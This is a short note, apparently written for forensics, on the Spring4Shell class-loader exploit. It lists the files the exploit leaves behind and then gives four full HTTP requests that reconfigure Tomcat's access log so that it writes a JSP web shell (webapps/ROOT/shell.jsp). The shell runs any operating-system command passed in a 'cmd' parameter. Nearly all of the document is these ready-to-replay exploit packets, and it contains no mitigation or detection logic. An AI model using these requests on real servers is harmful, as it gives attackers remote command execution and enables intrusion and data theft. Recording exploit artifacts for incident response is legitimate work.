## File Artifacts
- `logs/localhost_access_log_.txt` (localhost could be something different)
- `webapps/ROOT/shell.jsp` or different filenames depending on the exploit

## Exploit HTTP Packets
### 1. Resetting Log File Date Format

```http
POST /hello/greeting HTTP/1.1
Host: localhost:8080
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_
```
### 2. Modifying Log Configuration

```http
POST /hello/greeting HTTP/1.1
Host: localhost:8080
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 698

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
### 3. Writing Payload

```http
GET /hello/greeting HTTP/1.1
Host: localhost:8080
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
prefix: <%
suffix: %>//
c: Runtime
```

### 4. Resetting Log Configuration (Pattern)

```http
POST /hello/greeting HTTP/1.1
Host: localhost:8080
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

class.module.classLoader.resources.context.parent.pipeline.first.pattern=
```
